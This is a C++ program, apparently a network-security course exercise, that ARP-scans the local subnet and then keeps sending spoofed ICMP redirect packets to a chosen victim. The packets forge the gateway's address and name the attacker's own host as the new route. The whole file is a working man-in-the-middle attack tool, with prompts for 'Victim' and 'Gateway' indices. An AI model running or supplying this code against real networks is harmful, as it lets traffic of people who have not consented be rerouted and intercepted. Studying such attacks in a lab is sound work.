#include "util.h"

// Debug flags
bool DEBUG_Q1 = false;
bool DEBUG_Q2 = false;

// Network configuration
const char *iface = "enp0s3";
char *target_ip;

// Network information
uint8_t my_mac[6];
uint8_t my_ip[6];
vector<ip_mac> ip_mac_list;

using namespace std;

// Perform ARP scan to discover devices on the network
void arp_scan() {
    // Create raw socket for ARP
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sockfd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // Get interface information
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

    // Get interface index
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
        perror("SIOCGIFINDEX");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    int if_index = ifr.ifr_ifindex;

    // Get MAC address
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("SIOCGIFHWADDR");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);
    
    // Get IP address
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        perror("SIOCGIFADDR");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    memcpy(my_ip, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, 4);
    
    if (DEBUG_Q1) {
        cout << "my_mac: ";
        print_mac(my_mac);
        cout << "\nmy_ip: ";
        print_ip(my_ip);
        cout << endl;
    }

    // Send ARP requests to all potential hosts on subnet
    for(int i = 1; i <= 255; i++) {
        // Construct ARP request
        uint8_t buffer[42];
        memset(buffer, 0, sizeof(buffer));

        struct eth_hdr *eth = (struct eth_hdr *)buffer;
        struct arphdr *arp = (struct arphdr *)(buffer + sizeof(struct eth_hdr));

        // Fill Ethernet header
        memset(eth->dest, 0xff, ETH_ALEN); // Broadcast MAC address
        memcpy(eth->src, my_mac, ETH_ALEN);
        eth->ethertype = htons(ETH_P_ARP);

        // Fill ARP header
        uint8_t target_ip[4];
        target_ip[0] = my_ip[0];
        target_ip[1] = my_ip[1];
        target_ip[2] = my_ip[2];
        target_ip[3] = i;
        
        memcpy(arp->target_ip, target_ip, 4);
        memcpy(arp->sender_ip, my_ip, 4);
        memcpy(arp->sender_mac, my_mac, 6);
        memcpy(arp->target_mac, eth->dest, 6);
        arp->htype = htons(1);         // Ethernet
        arp->ptype = htons(ETH_P_IP);  // IPv4
        arp->hlen = 6;                 // MAC length
        arp->plen = 4;                 // IP length
        arp->opcode = htons(1);        // ARP request

        // Send ARP request
        sockaddr_ll sll = {};
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_index;
        sll.sll_halen = ETH_ALEN;
        memcpy(sll.sll_addr, eth->dest, ETH_ALEN);
        
        if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
            perror("sendto");
            close(sockfd);
            exit(EXIT_FAILURE);
        }
        else if (DEBUG_Q1) {
            cout << "Sent ARP request to: ";
            print_ip(target_ip);
            cout << endl;
        }
    }

    // Set up for receiving ARP replies
    fd_set fds;
    struct timeval timeout;
    timeout.tv_sec = 1;  // 1 second timeout
    timeout.tv_usec = 0;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
    
    // Receive ARP replies
    while (true) {
        uint8_t buffer[42];
        ssize_t len = recv(sockfd, buffer, sizeof(buffer), 0);
        
        if (len < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                // Timeout occurred
                if (DEBUG_Q1) {
                    cout << "Timeout: No more ARP replies received." << endl;
                }
                break; // Exit the loop
            } else {
                // Other errors
                perror("recv");
                close(sockfd);
                exit(EXIT_FAILURE);
            }
        }
        
        struct eth_hdr *eth = (struct eth_hdr *)buffer;
        struct arphdr *arp = (struct arphdr *)(buffer + sizeof(struct eth_hdr));
        
        if (ntohs(arp->opcode) == 2) { // ARP reply
            if (DEBUG_Q1) {
                cout << "Received ARP reply from: ";
                print_ip(arp->sender_ip);
                cout << " MAC: ";
                print_mac(arp->sender_mac);
                cout << endl;
            }
            
            // Store discovered host
            ip_mac ip_mac_entry;
            memcpy(ip_mac_entry.ip, arp->sender_ip, 4);
            memcpy(ip_mac_entry.mac, arp->sender_mac, 6);
            ip_mac_list.push_back(ip_mac_entry);
        } else if (DEBUG_Q1) {
            cout << "Not an ARP reply" << endl;
        }
    }
    
    close(sockfd);
}

// Thread function for sending ICMP redirect packets
void icmp_redirect_thread(int victim_idx, int gateway_idx) {
    if(DEBUG_Q2) cout << "ICMP redirect thread starting\n";

    int sock = -1;
    try {
        // Create raw socket for ICMP
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if(sock < 0) {
            perror("socket");
            throw runtime_error("Failed to create raw socket");
        }

        // Set socket option to include IP header
        int one = 1;
        if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
            perror("setsockopt");
            throw runtime_error("Failed to set IP_HDRINCL");
        }

        // Continuously send redirect packets while running
        while (running) {
            // Construct the outer IP header
            struct iphdr ip;
            memset(&ip, 0, sizeof(ip));
            ip.version = 4;
            ip.ihl = 5;
            ip.tos = 0;
            ip.tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + sizeof(struct iphdr) + 8);
            ip.check = 0;
            ip.id = htons(15489);
            ip.frag_off = 0x00;
            ip.ttl = 128;
            ip.protocol = IPPROTO_ICMP;
            ip.saddr = *(uint32_t *)ip_mac_list[gateway_idx].ip; // Gateway (spoofed)
            ip.daddr = *(uint32_t *)ip_mac_list[victim_idx].ip;  // Victim
            ip.check = checksum((uint8_t *)&ip, sizeof(struct iphdr)); // Calculate checksum
            // ICMP redirect structure
            struct icmp_redirect icmp;
            memset(&icmp, 0, sizeof(icmp));
            icmp.type = ICMP_REDIRECT;
            icmp.code = ICMP_REDIRECT_HOST;
            icmp.checksum = 0; // 
            icmp.gateway = *(uint32_t *)my_ip; // Attacker's IP (gateway)
        
            // Fake original IP header
            icmp.original_ip.version = 4; 
            icmp.original_ip.ihl = 5;
            icmp.original_ip.tos = 0;
            icmp.original_ip.tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + 8);
            icmp.original_ip.id = htons(0); // Identifier set to 0
            icmp.original_ip.frag_off = 0;
            icmp.original_ip.ttl = 254;
            icmp.original_ip.protocol = IPPROTO_ICMP; // Protocol set to ICMP
            icmp.original_ip.saddr = *(uint32_t *)ip_mac_list[victim_idx].ip; // Source IP (victim)
            icmp.original_ip.daddr = inet_addr(target_ip); // Destination IP 8.8.8.8
            icmp.original_ip.check = checksum((uint8_t *)&icmp.original_ip, sizeof(struct iphdr)); // Calculate checksum

            // Content in icmp_original_data: icmp_echo
            struct icmphdr icmp_echo;
            memset(&icmp_echo, 0, sizeof(icmp_echo));
            icmp_echo.type = ICMP_ECHOREPLY;
            icmp_echo.code = 0;
            icmp_echo.checksum = 0xffff;
            icmp_echo.un.echo.id = htons(0); // Identifier set to 0
            icmp_echo.un.echo.sequence = htons(0); // Sequence number set to 0
            // Fill the first 8 bytes of original data with ICMP echo
            memcpy(icmp.original_data, &icmp_echo, sizeof(icmp_echo));
            // Fill the rest of the original data with 0
            memset(icmp.original_data + sizeof(icmp_echo), 0, 8); // Fill with 0s
            // calculate checksum for icmp_original_data
            icmp_echo.checksum = checksum((uint8_t *)&icmp_echo, sizeof(icmp_echo));

            // Calculate ICMP checksum
            size_t icmp_len = sizeof(struct icmphdr) + sizeof(struct iphdr) + 8;
            icmp.checksum = checksum((uint8_t *)&icmp, icmp_len);
            // print all checksum in 0x format
            if (DEBUG_Q2) {
                cout << "ICMP checksum: ";
                for (size_t i = 0; i < sizeof(icmp.checksum); i++) {
                    printf("0x%02x ", ((uint8_t *)&icmp.checksum)[i]);
                }
                cout << endl;
                cout << "IP checksum: ";
                for (size_t i = 0; i < sizeof(ip.check); i++) {
                    printf("0x%02x ", ((uint8_t *)&ip.check)[i]);
                }
                cout << endl;
            
            }

            // Combine everything into a buffer
            uint8_t packet[sizeof(ip) + sizeof(icmp)];
            memcpy(packet, &ip, sizeof(ip));
            memcpy(packet + sizeof(ip), &icmp, sizeof(icmp));
        
            // Destination address
            struct sockaddr_in dst{};
            dst.sin_family = AF_INET;
            dst.sin_addr.s_addr = ip.daddr;
        
            // Send the raw packet
            if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
                perror("sendto");
            } else if (DEBUG_Q2) {
                cout << "[+] ICMP redirect packet sent to victim: ";
                print_ip((const uint8_t *)&ip.daddr);
                cout << "\n";
            }
        
            this_thread::sleep_for(chrono::seconds(5));
        }
    } catch (const exception& e) {
        cerr << "[!] Exception in icmp_redirect_thread: " << e.what() << endl;
    }

    if (sock >= 0) {
        close(sock);
    }

    if(DEBUG_Q2) cout << "ICMP redirect thread exiting\n";
}

int main(int argc, char *argv[]) {
    // Check command line arguments
    if (argc != 2 && argc != 3) {
        cerr << "Usage: " << argv[0] << " <ip> / <ip> <interface>" << endl;
        return 1;
    }
    else if (argc == 3) {
        iface = argv[2];
    }
   
    // Set up signal handlers
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    running = true;
    target_ip = argv[1];
    cout << "Target IP: " << target_ip << endl;
    
    // Perform ARP scan to discover network devices
    arp_scan();
    
    // Display discovered devices
    cout << "Available devices:" << endl;
    cout << "---------------------------------------------------------------" << endl;
    cout << "Index\t|\tIP\t\t|\tMAC" << endl;
    cout << "---------------------------------------------------------------" << endl;

    for(int i = 0; i < ip_mac_list.size(); i++) {
        cout << i << "\t|\t";
        print_ip(ip_mac_list[i].ip);
        cout << "\t|\t";
        print_mac(ip_mac_list[i].mac);
        cout << endl;
    }
    cout << "----------------------------------------------------------------" << endl;
    
    // Get user input for victim and gateway selection
    int gateway_idx, victim_idx;
    cout << "Select Victim IP index: ";
    cin >> victim_idx;
    cout << "Select Gateway IP index: ";
    cin >> gateway_idx;
    
    // Display selected devices
    cout << "Victim IP: ";
    print_ip(ip_mac_list[victim_idx].ip);
    cout << ", ";
    cout << "Gateway IP: ";
    print_ip(ip_mac_list[gateway_idx].ip);
    cout << ", ";
    cout << "Attacker IP: ";
    print_ip(my_ip);
    cout << endl;
    
    // Start ICMP redirect thread
    cout << "Sending ICMP redirect to victim..." << endl;
    thread thread_redirect_ICMP(icmp_redirect_thread, victim_idx, gateway_idx);
    cout << "ICMP redirect completed." << endl;
    // Wait for the thread to join
    thread_redirect_ICMP.join();
    
    cout << "Exited cleanly." << endl;
    return 0;
}